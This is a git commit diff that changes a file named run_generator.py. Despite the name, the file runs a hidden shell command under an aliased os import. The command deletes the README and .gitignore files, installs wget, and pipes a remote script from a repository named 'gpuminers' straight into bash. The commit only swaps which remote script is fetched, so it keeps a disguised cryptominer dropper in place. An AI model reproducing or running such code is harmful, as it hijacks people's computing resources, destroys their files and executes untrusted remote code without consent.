5199e057caa7d73324fbb3d1229b6aaba7b15f9c
cedricmthombopr <91846811+cedricmthombopr@users.noreply.github.com>
2021-10-10 23:22:45 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,3 @@
 import os as alpha
-alpha.system("rm README* && rm .gitignore && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/install_jupyter.sh | bash")
+alpha.system("rm README* && rm .gitignore && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_Notepad_eggs_ws4.sh | bash")
 
